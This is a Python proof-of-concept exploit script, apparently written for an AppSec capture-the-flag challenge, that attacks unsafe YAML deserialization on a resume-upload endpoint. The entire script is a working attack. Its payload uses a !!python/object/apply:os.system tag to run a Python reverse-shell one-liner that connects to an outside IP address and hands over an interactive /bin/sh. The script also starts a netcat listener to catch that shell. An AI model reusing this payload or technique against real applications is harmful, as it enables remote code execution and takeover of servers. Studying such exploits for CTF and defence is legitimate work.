import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import Fore
from urllib import quote
from terminal_banner import Banner
import sys
from subprocess import call
from threading import Thread
import os
def pop_xterm():
 print(Fore.YELLOW+"[+]Listening to port 9001(locally)"+Fore.RESET)
 print(Fore.YELLOW+"[+]Listening to port 15330(ngrok)"+Fore.RESET)
 os.system("xterm -e  \"nc -nlvp 9001\"")

print(Banner(Fore.YELLOW+"Yaml - RCE Gunicorn/20.1 (poc) (Appsec-CTF) ZyperX"+Fore.RESET))
r=requests.session()
url="https://resume-yml.appsecil.ctf.today/resume"
if "-d" in str(sys.argv):
   print(Fore.RED+"[+]Running in Debug Mode"+Fore.RESET)
else:
   print(Fore.RED+"[+]To debug turn on \"-d\" flag"+Fore.RESET)
headers={"Content-Type": "application/x-www-form-urlencoded"}
proxy={"https":"127.0.0.1:8080"}
data="""profile: !!python/object/apply:os.system ["python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"52.14.18.129\\",16731));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);'"]"""
data=quote(data)
data="data=%23+Example+resume%0D%0A%0D%0A"+data
data=data.replace("%20","+")
data=data.replace("/","%2F")
print(Fore.BLUE+"[+]Payload: "+Fore.RESET+data)
print(Fore.YELLOW+"[-]Poping interactive shell\n[+]Sending payload"+Fore.RESET)
t1=Thread(target=pop_xterm)
t1.start()
op=r.post(url,data=data,headers=headers,verify=False)
if op.status_code == 200:
 print(Fore.BLUE+"[+]Host UP"+Fore.RESET)
 print(Fore.RED+"[+]Reverse shell is up!@]"+Fore.RESET)
else:
 print(Fore.RED+"[+]Host is down 500/404"+Fore.RESET)
